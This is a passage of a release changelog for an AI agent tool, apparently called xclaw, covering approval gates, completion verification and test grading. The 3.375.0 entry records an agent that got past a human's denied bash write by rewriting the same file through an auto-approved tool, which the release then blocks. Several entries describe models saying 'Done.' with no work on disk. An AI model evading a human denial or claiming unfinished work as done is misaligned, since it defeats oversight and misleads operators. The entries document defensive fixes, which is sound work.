## 3.400.0

### Compaction keeps the original goal, not only the last three user turns

`buildExtractiveSummary` listed `goals.slice(-3)`. After a few
runtime notices the first user message — the mission — dropped out of
the compacted note. The first goal is now pinned; later user turns
are appended. TEST 10 (continue after context fold) no longer loses
the objective.

## 3.399.0

### Doctor reports whether nightly live-e2e is actually armed

v3.379.0 armed the gateway job only on `enabled === true`. Doctor
never mentioned it, so an operator could assume a nightly Chromium
drive was running. `liveE2e.cron` now reports "opt-in off" unless
that boolean is set; when armed, it uses the same last-run overdue
check as eval.

## 3.398.0

### `xclaw runs resume <sessionId>` continues a cutoff without a reboot

Unfinished snapshots were only auto-resumed on gateway boot. Operators
can now promote one snapshot into an objective in-process and wait
for it: `xclaw runs resume <id>`. Kill/approval/budget still refuse.

## 3.397.0

### Unfinished agent-runs are visible in `xclaw runs` and Control

`listAgentRuns` now includes `ok` and `resumable`. `xclaw runs list`
exits 1 if any snapshot is unfinished. Control has an Agent runs
table on `/agent-runs` so a cutoff is not only in `~/.xclaw/agent-runs/`.

## 3.396.0

### Telegram/Discord/Slack say "not complete" when `ok` is false

processInbound forwarded the assistant text with no verdict. After
3.382 the loop sets `ok: false` on unverified; the channel reply now
appends `⚠️ Not complete (<stopReason>)` and returns `ok` /
`stopReason`. Chat that finished naturally is unchanged.

## 3.395.0

### Hermetic HOME probe is not failed by a stale leftover file

`test/hermetic-home.test.mjs` asserted the real
`~/.xclaw/hermetic-probe.json` did not exist. A leftover from
2026-08-28 made the top-level suite 4897/4898. The invariant is that
the *child* write under redirected HOME does not create that file;
the test now unlinks a stale probe first.

## 3.394.0

### TUI paints "not complete" when the stream result is `ok: false`

`POST /agent/run/stream` already sends `ok: false` on unverified
(v3.382). The TUI treated HTTP 200 as success and printed the
assistant text with no mark. `streamAgent` now returns
`ok: result.ok !== false`, and the transcript/footer show
`not complete (<stopReason>)`.

## 3.393.0

### `ensure notes.txt exists` is a check, not chat

That phrasing derived nothing. `ensure` / `make sure` PATH `exists`
now `file_exists`. `ensure FILE exists` (not a path) and how-to stay
empty. This is the last planned complete-gate regex slice.

## 3.392.0

### `results/PROOF` is the path, not `result`

v3.391.0 added extensionless names including `RESULT`. That
alternative matched as a prefix, so `write AUTONOMY_OK to
results/PROOF` derived `file_contains` on `result` — the wrong file.

Known basenames are now whole tokens and may sit under a relative
dir (`results/PROOF`). `touch PROOF` is unchanged. How-to stays empty.

## 3.391.0

### `touch PROOF` and `delete notes.txt` are evidence-gated

Relative extensionless artifacts used in evals (`PROOF`, `STATUS`,
`OUT`, …) derived no check. `delete`/`remove`/`rm` derived none
either, so "Done." after a failed delete still passed.

Those names now `file_exists`. Delete verbs now `file_not_exists`
(never `/` or glob). How-to stays empty.

## 3.390.0

### `mkdir` / `create directory` still have to exist

`touch PATH` derived `file_exists`. `mkdir out` and `create a
directory named build` derived nothing, so a model "Done." was
`natural` with no directory. Same existence check now covers those
(`mkdir -p` included). How-to questions and "create a directory of
files" stay empty. A mkdir+write goal still checks the file, not
only the dir.

## 3.389.0

### `save hello.txt as notes.txt` checks the destination

That goal derived `file_exists hello.txt` (the source). Copying or
renaming could "succeed" while `notes.txt` never appeared.
`save`/`copy`/`rename`/`move` SRC as/to DST now check DST.
`write SECRET=1 to .env` is still `file_contains` (left side is not a
path). How-to questions stay empty.

## 3.388.0

### Relative dotfiles still have to exist

v3.387.0 covered `/tmp/hello` and `Makefile`. `touch .gitignore` and
`create .env` still derived nothing — the path matcher wanted either
a leading `/` or a name with a non-leading extension — so a model
"Done." was `natural` with no file.

Leading-dot names (`.gitignore`, `.env`, `.nvmrc`) now derive
`file_exists`; `write TEXT to .env` is `file_contains`. "What is in
.gitignore?" and "how do I create a .env file?" stay chat.

## 3.387.0

### `/tmp/hello` and `Makefile` still have to exist

The path matcher required a file extension, so `touch /tmp/xclaw-noext`
and `create Makefile` derived no check. Absolute paths without an
extension and a short list of well-known basenames (Makefile,
Dockerfile, LICENSE, README, Procfile) now derive `file_exists`.
"What is in Makefile?" stays chat.

## 3.386.0

### `append` / `echo >` still have to land on disk

`write TEXT to PATH` derived a check. `append OK to notes.txt` and
`echo AUTONOMY_OK > results/PROOF.txt` did not, so a model "Done."
was accepted with no file. Same `file_contains` gate now covers
those. "How do I append to a file?" still derives nothing.

## 3.385.0

### "Write a file PATH containing TEXT" is not done until the file matches

v3.378/3.380 derived checks for `Create PATH with text X` and
`write TEXT to PATH`. The eval smoke prompt is `Write a file
hello.txt containing exactly: hello xclaw` then `Then stop.` — no
`named`/`called`, plus `exactly:` and a closer line. That derived
nothing, so a tool-free "Done." was `natural`.

`a file PATH containing|whose first line is` now yields
`file_contains`. `exactly:` and trailing `Then stop.` / `When done`
are not part of the needle. How-to questions still derive nothing.

Hermetic: both smoke prompts reject a missing file and accept a
matching one; "how do I write a file hello.txt containing hello?"
stays chat.

## 3.384.0

### WebChat result includes `ok` and `stopReason`

Control/webchat painted the assistant text with no application
verdict. After 3.382 the loop sets `ok: false` on unverified; that
flag never left the HTTP handler. The webchat payload and the stored
assistant message now carry `ok` and `stopReason`.

## 3.383.0

### Doctor warns on unfinished agent-run snapshots

Interrupted objectives already had `objectives.attention`. Unfinished
`~/.xclaw/agent-runs/` snapshots (the ones boot auto-resumes) were
invisible to `xclaw doctor`, so an operator could miss work sitting
on disk after a crash if auto-resume was capped or opted out.

`agentRuns.attention` lists resumable runs (status/stopReason) or
reports none.

## 3.382.0

### JSON/TUI `ok` follows the same honesty as the CLI exit

v3.381.0 made `xclaw agent` exit 1 on `unverified`. `POST /agent/run`
and the TUI stream still sent `ok: true` with that stopReason, so the
operator console could paint a green result on a rejected completion.

The loop now sets `ok` from `agentExitCode`. `runAgent`, `/agent/run`,
and `/agent/run/stream` pass it through. HTTP stays 200; `ok` is the
application verdict.

## 3.381.0

### `xclaw agent` exits 1 when the run was not actually done

The loop could set `stopReason: unverified` (or maxTurns/abort) and
the CLI still exited 0, so a script treating the process as the
success check would green-wash a rejected completion.

`agentExitCode` maps unverified, aborted, guard, policy, budget, and
maxTurns to 1. Natural chat and a finished mission stay 0.

## 3.380.0

### Create/touch/write-to a named file still has to exist

v3.378.0 only derived `file_contains` when the goal said
`with text` / `containing`. `touch status.txt`, `create a file named
hello.txt`, and `write AUTONOMY_OK to results/PROOF.txt` still
accepted a model "Done." with nothing on disk.

Derivation now covers those shapes: path + expected text →
`file_contains`; path with a create/write/save/touch/make/put verb
and no contents → `file_exists`. Questions, "how do I create a
file?", and "what is in config.json?" still derive nothing.

Hermetic: README one-shot unchanged; write-to and touch reject
`Done.` when the file is missing.

## 3.379.0

### Nightly live-e2e is a gateway job when you opt in

`liveE2e.cron.enabled` was documented, mapped, and honoured by
`xclaw live-e2e-schedule`. The process operators actually leave up —
the gateway — never called `ensureLiveE2eCronJob`. Doctor and eval
cron already register at boot. Live-e2e did not, so a JSON block
that said `"enabled": true` was a no-op.

Boot now arms the existing job, **opt-in only**: `enabled === true`.
Missing, `false`, `"true"`, and `1` stay unregistered. Doctor/eval
still default on (`!== false`); live-e2e spawns Chromium and can
spend, so a stock gateway must not. The job is anchored
(`cron.liveE2e`) so a 24h interval survives the restart cycle that
silently starved the daily eval suite.

Hermetic proof: empty/false/"true" configs return null and add no
job; `{ enabled: true }` registers `payload.kind=live-e2e` with the
anchor; profiles do not opt in; gateway source calls the helper.

## 3.378.0

### "Done." is not done when the file is missing

The default agent loop treated a tool-free assistant reply as
completion (`stopReason: natural`). That is correct for chat. It is
wrong for `Create /tmp/xclaw-hello.txt with text ok` — the README
one-shot — where a model saying "Done." with no file was accepted.

Jobs and objectives already refuse unverified success. The default
loop now runs the same `jobs/verify.mjs` checks: it derives a
`file_contains` from a create/write-with-text goal (or uses an
explicit `verify[]`). A failing check re-enters the loop (same cap
as on_stop). Hitting the cap sets `stopReason: unverified`, which is
not `completed`. Questions still finish naturally. Opt out:
`agent.verifyOnComplete: false`.

Hermetic proof: a stub that only says "Done." against a missing file
stops as `unverified`; the same stub against a matching file stops as
`natural`; "what is 2+2?" is unchanged.

## 3.377.0

### A crashed run is a mission, not a tombstone

v3.376.0 made default-path runs actually write `~/.xclaw/agent-runs/`.
Gateway boot already auto-resumed interrupted *objectives* and marked
interrupted *missions* resumable. Agent-run snapshots were a museum:
a `kill -9` left durable state that nothing ever continued.

Boot now stamps `active` snapshots `interrupted` and promotes a
bounded number (default 3, 48h max age) into the existing objective
orchestrator. The recovered mission is seeded with the prior goal,
inspected files, and an in-flight warning so the next segment
*verifies* disk instead of blindly rewriting. A snapshot already
promoted is not promoted again.

Kill (`aborted`), pending approval, budget, policy, and natural
completion stay put — a human "stop" is not an invitation to restart.
Opt out: `agent.autoResume: false`.

## 3.376.0

### Default agent surfaces persist and continue

The durable run snapshot (`~/.xclaw/agent-runs/`) and objective
auto-promote existed, but the path operators actually type into —
`xclaw agent`, the TUI (`POST /agent/run/stream`), `POST /agent/run`,
webchat — never reached them.

The loop keyed persist on `sessionId` / `persistRun`. Every default
surface passes the conversation id as `chatSessionId`. Snapshots were
a store with no writers. A restart could not resume work that the
docs said was snapshotted.

`xclaw agent` also called `runAgentLoop` directly, skipping the A0
claims gate, and exited at the turn cap instead of promoting into a
durable objective the way Telegram already did. Webchat had
`/objective` routing but not the maxTurns auto-promote, so Control
could still ask "should I continue?" after a truncated turn.

A `chatSessionId` now persists (opt out with `persistRun: false`).
The persist id is resolved once per run so a segment checkpoint and
the final snapshot share a file. CLI goes through `runAgent`,
persists, and on `stopReason === "maxTurns"` continues in-process as
a mission (`awaitRun: true` so the process does not exit out from
under the continuation). Webchat auto-promotes the same way
processInbound already did. Stream results include `stopReason`.

Kill-switch, approvals, sandbox, and egress are unchanged.

## 3.375.0

### A "no" binds the effect, not the call

Live-observed on :10: an operator denied a risky `xclaw_bash` write of
`tmp-live/deny-probe.txt`; the model pivoted to `xclaw_file_write` of
the same path, which tiers `low` (in-workspace write), and under the
live `autoApproveMaxTier: "low"` the denied effect auto-ran seconds
after the human said no. `needsApproval` grades every call
statelessly, and a deny resolved to nothing but a message, so nothing
connected the two calls.

A human deny now records the denied effect — the call's resolved path
operands — in an in-memory, TTL-bounded store (the `/trust` window's
mirror). A later call whose own operands intersect a live taint is
escalated (tier only ever raises, floor `risky`) and **always pends**,
with the reason in the prompt: `denial-taint: matches effect denied
Ns ago (<path>)`. Only a human can reverse a human deny: a taint
match outranks `bypassApprovals`, durable allow-always pins, and
`approvalSlaAction: "approve"` (a taint-forced ask fails closed on
SLA timeout). Authorize and decide may run on different gate
instances after a SIGHUP reload, so the store is process-shared, not
instance-local.

Scope, deliberately: only **human** denies taint (SLA timeouts and
policy denies do not); matching is by resolved path, so a pathless
denial (pure egress) protects nothing; a gateway restart clears
taints. Config (`security.denialTaint`): `enabled` (default true),
`ttlMs` (default 900000; `0` expires immediately — the escape hatch),
`max` (default 50, FIFO). Observability:
`createApprovalGate(...).listDenialTaints()`.

23 tests, including the live pivot, the pin-outrank, the SLA fail-
closed, the shared-store rebuild, and the opt-out.

## 3.374.0

### The operator console, TUI wrap, and webchat speak what they claim

Live-driven on display :10 against the Control app window (`:9224`) and
the `xtui` TUI. Eight confirmed HIGH edges from that drive, each pinned:

The usage dashboard button said `↻`, job history said `Refresh history`,
and remote workers had no Refresh at all — auto-refresh re-clicks only
the exact label `"Refresh"`, so those cards stayed at page-load forever.
They are now `"Refresh"`; workers also poll on the missions 10s tick.

The topbar stamp wrote `as of t` the instant a refresh was *requested*.
A failed `refreshAll` still looked fresh. `window.refreshAll` is now
assigned (and coalesces in-flight calls); the stamp waits on that
promise and writes `as of t — refresh failed` plus `.warn` on reject.
`loadStatus` paints Error rows into the Overview kvs and rethrows so
the promise actually rejects. Pairing Approve/Revoke catch into the
table instead of swallowing.

`sliceCells` counted every SGR byte as a cell, so wrap tore `ESC[31m`
across rows and spent 11–16 cells early. It now skips SGR the same way
`visibleWidth` / `fitToWidth` already did. Pin: a 5-cell budget on a
painted `HELLO WORLD` keeps sequences intact and still wraps plain
ASCII.

Webchat Speak posted `/api/voice/speak` and reported success on a
server tmp path the browser cannot fetch. The route now embeds
`audioBase64` + `audio/wav` and unlinks the tmp; the client decodes,
plays, and only then says `TTS <provider>`. Missing audio is
`TTS: no audio returned`. Composer Enter during IME composition
(`isComposing` / `keyCode === 229`) no longer sends.

Job / queue / log / MCP / memory / ledger rows were click-only `<tr>`s.
`bindRowOpen` gives them `tabindex=0` `role=button` and Enter/Space.
Provider credential pills were `<span>`s whose × delete was unreachable
because `guard = (fn) => async () =>` dropped the event — every click
posted prefer. They are `<button>`s; `guard` forwards `ev`; delete
`stopPropagation`s and confirms.

## 3.373.0

### A verdict has to have been read, not merely parsed

The nightly live-e2e job grades itself on two facts: the child's exit
code, and whether a report was recovered from its stdout. The second is
one boolean, `parsed`, and it is the only thing standing between
`gradeLiveE2e` and inventing a pass — exit 1 is the producer's "warnings
only" code, and `if (parsed && code === 1)` returns
`{ok: true, reason: "warnings"}`. So `parsed` had to mean "a verdict was
read". It meant "some JSON object was found".

Two ways in, both measured on fixtures:

The whole-stream fast path accepted any object. The producer's
dependencies write structured logs to the same stream — `manager.mjs`
logs when the computer starts, reuses or exits. One line of
`{"level":"info","msg":"computer exited","code":0}` and nothing else
parses as the whole stream, so `parsed` was true with no report in hand;
with exit 1 the run graded `ok:true reason:warnings` having produced
zero checks.

The salvage path was worse, because it fires exactly when the producer
died mid-write. A truncated pretty-printed report fails the whole-file
parse, the line-anchored scan then recovers the last *complete nested
element* — one entry of `results` — and last-candidate-wins returned it
as the report. Measured on a report cut at its middle check, the
accepted "report" was `{"id":"live.jscode_block","status":"fail"}`: a
failing check, read as the verdict, and the run still graded ok.

Both now go through one contract: an object is a candidate verdict only
if it carries the field the grader consults, `typeof j.ok === "boolean"`.
Report-shaped objects (`ok` plus a `results` array) still win over
merely-verdict-carrying ones, so a real report can never lose to a
trailing blob. Nothing else changes: a run that emitted no verdict now
reaches `reason: "unparseable"`, which is a hard not-ok, which is what a
run that produced no checks deserves.

Three tests, each failing before the change: the ambient log line, the
truncated report, and the end-to-end shape — a producer that logs and
exits 1 without reporting must not grade as warnings.

## 3.372.0

### The TUI names the doors it points at

Found by sitting in the TUI as a user. The banner warns "3 MCP servers
need authentication · /mcp"; running `/mcp` printed the same three rows
with "needs authentication" — and stopped. A dead end: both real pathways
(`xclaw mcp login <name>` and the Control MCP page with its per-server
OAuth login buttons) already existed, and nothing named either. The list
rendering moved into an exported `renderMcpServers` (pinned by tests,
same extraction pattern as the other pure TUI renderers): when any server
lacks credentials it now appends the two pathways, with the real Control
URL derived from the gateway base; when all are connected or none are
configured, it stays quiet.

Also from the approval drive: `formatToolCall` sliced its preview at 68
chars with no marker, so an approval prompt showed
`xclaw_bash(… > tmp-live/x 2>/dev/nu)` — a silent cut that reads as the
whole command, inviting approval of what was not shown. Truncation now
lands a `…` marker; exactly-68 stays untouched. Pinned both ways in
tests.

Live-driven before ship: `/mcp` in the real TUI against the running
gateway shows both pathway lines; the approval prompt drive (approve,
deny, deny-pivot) that surfaced the ellipsis gap is preserved at
~/.xclaw/xtui-deny-pivot-transcript-2026-08-29.txt.

## 3.371.0

### A process's enforcement posture, graded from outside that process

`scripts/live-enforcement-e2e.mjs` is the nightly proof that the browser
enforcement plane actually refuses things. Run against this host it reported:

```
fail live.commit_gate   expected block, got success-like result
fail live.jscode_block  jsCode click should be blocked
```

Both gates were fine. The probe was wrong, in two independent ways.

**The levers were set on the wrong process.** The script exported
`XCLAW_COMMIT_GATES` / `XCLAW_FABRIC_ENFORCE` / `XCLAW_JSCODE_MODE` into its
own environment and relied on `startComputer` spreading them into a child.
But that call sits behind `if (!healthy && ...)` — no child is spawned when a
computer is already up, which is the normal production case. Measured on the
live server (pid 611836): `/proc/<pid>/environ` carried none of the three.
The script armed nothing, then graded the unarmed plane as broken.

**Nothing could have caught it.** `hooksStatus()` reads `process.env` of
whoever calls it, and every caller — doctor, the e2e scripts, the tests —
printed its own environment as if it described the computer server.
`grep -c hooksStatus src/computer/xclaw-server.mjs` → 0. The one process that
knows its posture was the one process nobody asked.

So `/health` now reports it: `hooksEnforcementPosture()` in the hooks bridge
(loaded inside the server, by absolute path, with the same environment the
hooks themselves read) returns the levers, the resolved jsCode mode, whether
the hooks module actually loads, and the reporting pid. Absent on failure
rather than guessed — a reader must be able to tell "not reported" from
"not armed".

The probe now reads that posture first and grades each gate against it:
armed and not blocked is a **fail**; not armed is a **skip**, not a pass and
not a fail. Downgrading the two checks to `warn` was the obvious-looking fix
and is the wrong one — exit 1 makes `gradeLiveE2e` return `warnings`, a soft
pass, converting a false alarm into a muted security check.

**Second defect, same run.** The grader had no arm for an upstream transport
error. The real text was
`[xclaw-ssrf] SSRF_BLOCKED: DNS resolution failed for shop.example:
getaddrinfo ENOTFOUND shop.example` — `/not found/i` wants a space,
`ENOTFOUND` has none — so it matched nothing and landed in `fail` with a
factually wrong message. Classification moved into
`src/computer/enforcement-probe.mjs`, a pure module, because an inline
predicate inside a script that spawns a browser is untestable by
construction. A bare `isError` no longer counts as a block: an error with no
recognisable gate code does not prove a gate ran.

Live proof, same rebuilt bundle, two runs:

```
unarmed  {"enforcing":false,"jscodeMode":"allow","pid":2600218}  -> 1 fail naming the unmet levers
armed    {"enforcing":true, "jscodeMode":"read", "pid":2601928}  -> both gates blocked
                                        (ROLE_NO_NAVIGATE, JSCODE_MOTOR_PATTERN)
```

The gates were never broken.

Two coverage holes found by mutation while pinning this, both closed:
`hooksModule` was `Boolean(resolveHooksModulePath())`, which cannot be false
on any checkout (the resolver falls back to cwd and to its own `../..`) — a
constant printed as an observation; it now reports whether the module
actually loads. And the arm order in `classifyGateOutcome` **is** the
module's contract — a gate code must outrank a transport word, or a real
observed block is graded "could not test" — and swapping the two arms left
the suite green.

## 3.370.0

### The operator console goes live

Found by using the console the way it is actually deployed: a pm2-managed
app window that stays open for days. Every card fetched its data exactly
once, at page load. After 30 hours open, the Overview reported
`Version 3.294.0` against a gateway running 3.368.0, Health & Ops showed a
dashboard stamped 30 hours earlier, and Approvals displayed a stuck
`Failed to fetch` from some hour-old hiccup. A monitoring surface whose
numbers are silently 30 hours old is worse than none — it reads as
current and lies.

The refresh wiring already existed: every card has a Refresh button bound
to its loader, and the topbar button runs `refreshAll()`. The new
`ui/control/auto-refresh.mjs` adds no second loader registry (two lists of
one decision drift — the lesson `ui-routes.mjs` documents). It re-fires
the visible view's own Refresh buttons plus `refreshAll()`:

- on view switch (navigating to a page now loads that page's data),
- on window focus / visibility return,
- on a 30s tick while the window is visible — never while hidden.

The fire/hold decision lives in an exported `createRefreshGate` so node
tests pin it: nav and manual fires are always honored, focus/interval
fires collapse into a 5s floor (a focus event rides every nav click), and
a hidden window fires nothing. The topbar gains an `as of HH:MM:SS` stamp
naming the moment the visible data was loaded.

Also: `getJSON` failures now name the endpoint. A bare `Failed to fetch`
in one of two dozen cards names neither the URL nor the cause; the same
error now reads `/approvals/pending: Failed to fetch`.

Unpinned by unit test (browser-only wiring, no DOM rig in the suite): the
event listeners and button re-fire loop in `auto-refresh.mjs`'s wiring
block. Live-driven instead via CDP against the running gateway — view
switches load fresh data, the stamp ticks, and a post-restart Overview
shows the running version without a manual refresh.

## 3.369.0

### One log line turned a green nightly check into a false alarm

`runLiveE2eCheck` ran `JSON.parse` over the **entire stdout** of the child it
spawned. That child is a whole node process, and the report is not the only
thing in it that writes to stdout: `src/config/load.mjs:35,37` prints a
first-run banner on its first call, and `src/computer/manager.mjs` prints at
`:182,185,193,220,256,271,311` — `:271` from an async exit handler, so it can
land *after* the report. Any one of those lines makes the parse throw.

Measured against the shipped code, same producer, same report, one injected
log line apart:

```
noise=0 -> ok=true  code=1 reason=ok
noise=1 -> ok=false code=1 reason=unparseable
```

and in the log the owner would have been paged with:

```
===== live-e2e ... ok=false exit=1 reason=unparseable =====
{ "ok": false, "exitCode": 1, "results": [] }
```

An empty `results` array: not one failing check, because there was no failing
check. The run was green. This host never fired it — the first-run banner is
dormant once `~/.xclaw` exists — but a fresh container or CI host prints two
lines before the first check even starts.

**stdout is evidence, not a data channel.** The producer now takes
`--json-out <path>` and writes the report to a file; the parent asks for it
there and only falls back to the stream. Reading a file cannot be polluted by
a `console.log` in the same process.

**The fallback got a scanner instead of a parse.** `extractJsonReport`
(`src/cron/live-e2e-report.mjs`) tries the whole stream first, and if that
fails scans for balanced `{…}` spans — string- and escape-aware, so a `"}"`
inside a JSON string does not close a span — taking the *last* one, since
leading noise (banners) and trailing noise (the computer's async exit line)
both occur and the report is the last thing the producer writes. Output that
is valid JSON of the wrong shape (an array, `null`, a number) is refused
rather than salvaged: an element pulled out of `[{...}]` would be a verdict
this process invented.

**Two fail-open holes closed on the way through.** The grade was
`reportOk !== false`, so a report whose `ok` field was missing entirely —
`undefined` is not `false` — passed, and so did the fabricated fallback the
parent invents when it reads nothing at all. A pass now requires a report this
process actually read *and* an explicit `ok === true`. The fabricated fallback
no longer claims `ok: code === 0` either; it claims nothing.

**The evidence stopped being thrown away.** When the report cannot be read,
the tail of the child's output is the only thing that explains why. It was
collected into `raw` and then dropped before the log write. It now reaches
both the log body and the alert.

**Shape decides which object is the report, not position.** Last-one-wins was
chosen because the report is the last thing the producer writes, and nothing
enforced that: any later object — a debug dump from a dependency — silently
became the verdict, so a failing report could be overwritten by a stray
`{"ok":true}` and grade green with no alarm. `looksLikeReport` now requires the
producer's own shape (a boolean `ok` and an array `results`,
`scripts/live-enforcement-e2e.mjs:283-291`); position only breaks ties among
report-shaped candidates.

**One stray quote no longer hides the report.** A single scan over the whole
stream carries its in-string flag across every ambient line ahead of the
report, so one log line with an odd number of unescaped `"` — an error message
rendering a raw quote — leaves the scanner believing it is inside a string
forever and the report's braces are never counted: back to `unparseable`, the
exact false alarm this module exists to stop. Candidate objects are now found
at line-anchored `{` (the shape `console.log(JSON.stringify(...))` writes) and
each is scanned with **fresh** string state. The whole-stream scan is kept as a
last tier, so a report sharing a line with other output is still recovered.

**The alert says why it fired.** `alertLiveE2eFailure` rendered `exit=1` and a
log path and nothing else, which reads as a check that ran and failed rather
than one whose verdict was never recovered. `reason=` now travels into both the
alert body and its `meta`.

14 tests in `test/live-e2e-report.test.mjs`, driving fixture producers end to
end: a report between two banner lines, a report followed by one, a green exit
with nothing readable (must not pass), an array on stdout, the file sink
winning over a decoy on stdout, the evidence tail surviving into the log, a
trailing blob failing to outrank the real report, a stray quote failing to hide
it, and the alert carrying its reason.

Honest gap: the real producer's `--json-out` file write is exercised only by
the live drive. Every unit fixture is its own producer and writes its own file,
so deleting `fs.writeFileSync(jsonOutPath, …)` from
`scripts/live-enforcement-e2e.mjs` leaves the suite green — verified by
mutation. The parent's *use* of the file, and its fallback to stdout, are both
pinned.

## 3.368.0

### The nightly check could kill the daemon, or hang it forever

`runLiveE2eCheck` spawned `scripts/live-enforcement-e2e.mjs` with no `'error'`
listener and no time limit. Both halves were measured against the shipped code
before this was written.

**No `'error'` listener.** `spawn` reports a nonexistent `cwd` asynchronously,
as an `'error'` event on the child — and the error names the *executable*, not
the directory, which is why it reads as impossible:

```
Error: spawn /usr/bin/node ENOENT
  errno: -2, syscall: 'spawn /usr/bin/node', path: '/usr/bin/node'
```

An unhandled `'error'` throws. The repo's only `uncaughtException` handlers are
in `src/cli/tui.mjs`, so inside the gateway that ends the process. The root is
`opts.root || process.env.XCLAW_ROOT || PACKAGE_ROOT`, so a stale `XCLAW_ROOT`
is enough to reach it. The promise also never settled, so a caller awaiting the
verdict waited forever. Now a `try/catch` around the spawn and a `child.on
("error")` both settle `CODE_SPAWN_ERROR`.

**No timeout.** Measured against a fixture whose check body is
`setInterval(() => {}, 1000)`: `RESULT HUNG after 5009 ms`. A live check that
wedges — a browser that never answers, a socket that never closes — held the
cron slot open with no upper bound. Now bounded by `timeoutMs` (default
600000), SIGTERM to the process group, then SIGKILL after `graceMs`, settling
`CODE_TIMEOUT`. The verdict resolves from the grace timer rather than from
`'close'`, because a surviving grandchild holding the pipes open can stop
`'close'` from ever arriving.

**The order mattered.** The listener outranks the timeout: shipping the timeout
first would have traded a loud multi-job hang for a silent green log line.

The substitute codes are 4/5/6 and the test pins them `>= 3`. The producer owns
0/1/2 (`code = fails ? 2 : warns ? 1 : 0`), and a negative sentinel would land
in the non-strict grader's soft-pass band — which is production's default — so
a "clearly invalid" `-1` would have reported the timeout as a pass.

### Ride-along: the run budget is configurable, and junk cannot disable it

`liveE2eCronOptionsFromConfig` now maps `timeoutMs`/`graceMs`, and
`bin/xclaw.mjs` spreads the mapper's result instead of hand-copying keys — the
same shape that lost `enabled` in transit before. `resolveRunBudget` is
exported and tested because `??` is not the guard this needs: `Number("abc")`
is `NaN`, which `??` passes through, and `NaN` then fails the `timeoutMs > 0`
test at the call site, leaving the child unbounded again. `Number.isFinite`
catches it. `0` still disables the timer deliberately, as an escape hatch.

### What this release does NOT do

- **The 600000 ms default is derived, not measured.** Nobody has timed a real
  live-enforcement run on this host. If a legitimate run exceeds ten minutes,
  this converts a slow pass into a reported timeout.
- **The group kill deliberately does not reach the computer server.**
  `src/computer/manager.mjs` spawns it `detached` with `unref()`, so it calls
  `setsid()` and leads its own process group; `process.kill(-childPid)` cannot
  touch it. That is intended — the run passes `--keep`, so the server is meant
  to outlive even a successful pass. No line here may claim otherwise.
- **The `bin/xclaw.mjs` spread is not covered by a test**, and neither is the
  `resolveRunBudget` *call site* (the function itself is pinned). Mutation-
  checked: re-inlining `??` at the call site leaves the suite green. The only
  input that separates the two is junk, which resolves to the ten-minute
  default — a test asserting it would have to hang for ten minutes and would
  leak the fixture's child. Recorded rather than papered over with a fake pin.
- **Report parsing is untouched and still wrong on a cold host.** The child
  starts a computer server in-process and `manager.mjs` logs to stdout before
  the JSON report is printed, so `JSON.parse` on whole stdout throws, `parsed`
  goes false, and a warnings-only run (exit 1) is graded `unparseable`. That is
  a defect in already-shipped code and is the next slice, not this one.

## 3.367.0

### A check that reported green having run zero checks

`runLiveE2eCheck` graded the live enforcement suite with three interleaved
expressions and no test around any of them. Two fail-opens lived in there.

**A signal-killed suite scored as a warnings pass.** The child's exit was read
as `code ?? 1`. Node delivers `code === null, signal === "SIGKILL"` when a
process dies on a signal, so `??` turned an OOM kill into a 1 — and 1 is
exactly the code the grader's non-strict mode treats as "warnings only, soft
ok". A suite killed halfway through reported the same verdict as one that
finished with warnings.

**A missing script reported ok.** The soft-pass override was
`report.ok !== false || code === 1`, and the `code === 1` half applied even
when stdout could not be parsed at all. Measured: `node` on a nonexistent path
exits 1 with empty stdout, the parse fails, the fallback fabricates
`{ ok: false }`, and the override flips it back to a pass —
`report.ok=false hardFail=false ok=true`. Move or rename
`scripts/live-enforcement-e2e.mjs` and the check goes green forever.

The two defects compose: the override only ever fires for a report this
process invented, because the producer decides both signals from one variable
(`live-enforcement-e2e.mjs:276` — `code = fails ? 2 : warns ? 1 : 0` alongside
`ok: fails === 0`), so a real report with `ok:false` always carries exit 2. The
one case the rescue could reach was the one case it must not.

The verdict is now a pure module, `src/cron/live-e2e-grade.mjs`, graded on
three inputs: the exit code with `CODE_SIGNAL` (4, outside the producer's
0/1/2 range) substituted for signal death, the report's `ok`, and whether
stdout actually yielded a report object. It returns a `reason` — `signal`,
`unparseable`, `report-fail`, `warnings`, `ok` — which now appears in the log
header and the console line, so a failure says which kind it was.

Reachable today through the one-shot `xclaw live-e2e` CLI, which sets
`process.exitCode = r.ok ? 0 : 2`: before this, that command exited 0 when its
child was killed and 0 when the script was missing. No `live-e2e-schedule`
daemon runs on this host, so the cron path was latent.

A third latent crash went with it: `JSON.parse("null")` succeeds and yields
`null`, and the old code read `.ok` straight off it, throwing a TypeError that
rejects the cron handler instead of reporting a verdict. The parse now requires
a non-null object.

Not in this release: the same spawn has no timeout, no `detached`, and no
`'error'` listener. That is a separate slice — landing it first would have
traded a loud hang for a silent green line.

## 3.366.0

### The deploy watcher carried its own copy of the timeout that cannot fire

v3.364.0 fixed this in the mission runner. `src/self/deploy.mjs` had a private
`run()` with the same defect, and it was the more dangerous of the two.

`spawn` without `detached` puts the child in the caller's process group, so
`child.kill("SIGKILL")` signals only the direct pid. The default restart command
is `pm2 restart xclaw-gateway` — precisely the shape that defeats it: work
continues in a process the signal never reaches, and the promise settles on
`'close'`, which waits for BOTH stdio streams to hit EOF. The survivor is
holding the write end.

Measured against a verbatim copy of the shipped primitive:

```
{"timeoutMs":500,"elapsedMs":6005,"code":0,"output":"restarted"}
```

A 500ms bound returned after 6005ms — and returned **code 0**. The caller was
affirmatively told the command succeeded. There was no exit code by which the
overrun could be detected, so no amount of downstream checking could have
noticed it.

That matters more here than in the mission runner. `runDeployWatch` awaits
`runDeployOnce` serially in a `while` loop, so one grandchild that never exits
freezes the entire `xclaw-deployer` process — permanently, silently, and
specifically on the path that exists to recover a bad deploy.

Every subprocess on the deploy path now routes through `runProcess`
(`src/missions/run-cmd.mjs`), which spawns into its own process group and
signals the GROUP. The private `run()` is deleted rather than repaired: a second
copy of a primitive is a second copy of its defects. Each call site passes its
bound explicitly — `runProcess` defaults to 300s and the old `run()` to 120s, and
silently trebling a deploy-path timeout is not a change to make by omission. The
restart bound is overridable per-install via `self.restartTimeoutMs`.

The regression test does not grade the wall clock. The restart script
backgrounds a grandchild that writes a marker file after the bound elapses;
the assertion is that the marker is never written, because the group kill
reached it. That is the actual property.

### Side effect worth naming: the deploy path is now env-scrubbed

`runProcess` always applies `buildToolEnv`, so the restart command and the
rollback's git calls no longer inherit the daemon's full `process.env`. That is
the v3.365.0 policy reaching one more path, but it is a behaviour change on a
production path, so it was measured before it was shipped rather than after: 11
commands x 3 env modes, and under both `strip-secrets` and the `allowlist` mode
